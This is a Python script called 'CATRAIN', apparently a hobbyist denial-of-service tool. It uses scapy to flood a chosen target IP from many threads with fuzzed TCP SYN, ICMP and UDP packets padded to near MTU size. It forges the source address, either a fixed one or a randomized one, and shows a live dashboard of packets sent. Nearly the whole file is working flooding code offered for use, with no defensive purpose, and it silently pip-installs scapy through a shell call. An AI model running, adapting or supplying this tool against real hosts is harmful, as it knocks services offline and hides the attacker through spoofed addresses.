from argparse import ArgumentParser as AP 

print("ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos, Queen >⩊<") 

import subprocess as s; from sys import exit as sex 

try:
	if b"scapy" not in s.check_output("pip list", shell=True):
		s.call("pip install scapy", shell=True) 
finally: 0 

import argparse as AP 

def get_args():
	parser = AP.ArgumentParser(description="Catrain by Queen, Lmaos :3") 
	parser.add_argument("-i", "--ip", type=str, nargs='?', help="Target IP address") 
	parser.add_argument("-c", "--count", type=int, help="Packet run count (3 packets per run)") 
	parser.add_argument("-s", "--srcip", type=str, help="Source IP (default: 192.168.1.2)") 
	parser.add_argument("-t", "--threadcount", type=int, help="Thread count") 
	parser.add_argument("-p", "--showping", type=str, choices=['y', 'n'], help="Show ping (y/n, default: y)") 
	parser.add_argument("-e", "--hidethreads", type=str, choices=['y', 'n'], help="Hide most threads from showing in UI. Recommended for 40+ threads (y/n, default: n)") 
	parser.add_argument("-d", "--data", type=str, help="The data to be sent. No more than 1456 chars. Is repeated and cut off to fill up 1024 chars (default: 'HI! :3 ')") 
	parser.add_argument("-r", "--randomsrc", type=str, choices=['y', 'n'], help="Randomize the source IP. (y/n, default: y)") 
	return parser.parse_args() 

if __name__ == "__main__": 
	try: 
		args = get_args() 
		if not args.ip or args.count is None or args.threadcount is None: 
			target_ip = args.ip if args.ip else input("\t\t\t      IP: ") 
			count = args.count if args.count is not None else int(input("Packet run count (3 packets per): ")) 
			threadcount = args.threadcount if args.threadcount is not None else int(input("\t\t    Thread count: ")) 
		else: target_ip, count, threadcount = args.ip, args.count, args.threadcount 
		srcIp = args.srcip if args.srcip else "192.168.1.2" 
		showp = args.showping if args.showping else "y" 
		hideThreads = args.hidethreads if args.hidethreads else "n" 
		data = bytes(args.data, 'utf-8')*(int(1456/len(args.data))) if args.data else b"HI! :3 "*int(1456/7) #! Eth MTU size = 1500, -44 for TCP headers == 1456 
		randIp = args.randomsrc if args.randomsrc else "n" 
	except Exception as e: print(f"\nError: {str(e)}. Type more carefully ffs."); sex() 


rno = [True] * threadcount; rcount = [0] * threadcount 

from scapy.all import IP, TCP, ICMP, UDP, send, fuzz, Raw 

if randIp == "n":
	def scr(number):
		try: 
			packetT = IP(dst=target_ip, src=srcIp) / fuzz(TCP(flags='S')) / Raw(load=data) 
			packetI = IP(dst=target_ip, src=srcIp) / ICMP() / Raw(load=data) 
			packetU = IP(dst=target_ip, src=srcIp) / fuzz(UDP()) / Raw(load=data) 
			for i in range(count):
				send(packetT, verbose=0); send(packetI, verbose=0); send(packetU, verbose=0) 
				rcount[number] += 1 
		except Exception: 0 
		rno[number] = False 
else:
	from random import randint as r 
	def scr(number):
		src = f"{r(1, 255)}.{r(0, 255)}.{r(0, 255)}.{r(1, 255)}" 
		try: 
			packetT = IP(dst=target_ip, src=src) / fuzz(TCP(flags='S')) / Raw(load=data) 
			packetI = IP(dst=target_ip, src=src) / ICMP() / Raw(load=data) 
			packetU = IP(dst=target_ip, src=src) / fuzz(UDP()) / Raw(load=data) 
			for i in range(count):
				send(packetT, verbose=0); send(packetI, verbose=0); send(packetU, verbose=0) 
				rcount[number] += 1 
		except Exception: 0 
		rno[number] = False 

from threading import Thread; from time import sleep, time; from os import name as osname; from re import search 

starttime=time() 

threads = [] 
for x in range(threadcount):
	t = Thread(target=scr, args=(x,)); t.start() 
	threads.append(t); print(f"called sub {x+1}") 

while any(rno):
	try: 
		sleep(0.4) 
		if osname == "nt": s.call("cmd.exe /S /C cls", shell=True) 
		else: s.call("clear", shell=True) 
		elt = int(search(r"\d+", str(time()-starttime)).group(0)) 
		status_lines = [] 
		status_lines.append("THR no. | Running\t| Packets sent\t| Packet run no.") 
		status_lines.append("—" * 56) 
		if hideThreads == "n": 
			for i in range(threadcount): status_lines.append(f"{i+1}.\t| {rno[i]}\t\t| {str(rcount[i]*3).zfill(8)}\t| {str(rcount[i]).zfill(8)}") 
		else: 
			for i in range(max(1, min(int(threadcount/25), 10))): status_lines.append(f"{i+1}.\t| {rno[i]}\t\t| {str(rcount[i]*3).zfill(8)}\t| {str(rcount[i]).zfill(8)}") 
		if showp == "y": status_lines.append(
f"\nTarget IP: {target_ip}   \t\tCurrent ping: {str(search(r"time\s*([<]?\s*\d+(?:\.\d+)?\s*(?:ms|s))", str(s.check_output(f"ping {target_ip} -n 1", shell=True))).group(1))}") 
		else: status_lines.append(f"\nTarget IP:   {target_ip}") 
		status_lines.append(f"'Source' IP: {srcIp if randIp == "n" else "Randomized "}    \t\tTotal estimated packets: {rcount[int(len(rcount)/2+0.9)]*3*threadcount}") 
		if hideThreads == "y": status_lines.append(f"Time: {int((elt-(elt%(60**2)))/(60*60))}h {int((elt-(elt%60))/60)}min {elt%60}s\t\t\tTotal threads: {threadcount}") 
		else: status_lines.append(f"Time: {int((elt-(elt%(60**2)))/(60*60))}h {int((elt-(elt%60))/60)}min {elt%60}s") 
		status_lines.append(f"Completion: {str(search(r"\d+[\.,](?:\d\d\d|\d\d|\d)", str((rcount[int(len(rcount)/2+0.9)]/count)*100)).group(0))}%\t\t\tData: {str(data).removeprefix("b")if not args.data else f"'{args.data}'"}") 
		print("\n".join(status_lines)) 
		sleep(0.1)
	except Exception: 0 

input("\nAll sent~~") 

